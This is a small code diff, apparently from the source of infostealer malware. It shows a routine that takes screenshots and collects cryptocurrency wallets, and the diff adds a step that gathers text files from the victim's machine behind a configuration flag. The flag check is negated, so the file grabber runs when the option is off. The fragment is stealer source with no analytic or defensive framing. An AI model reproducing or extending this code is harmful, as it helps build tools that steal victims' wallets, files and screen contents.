@@ -110,4 +110,6 @@ void Other()
 {
 	images::Screenshot();
 	wallets::Wallets();
+	if (!config::enableFileGrubber)
+		files::Txt_files();
 }
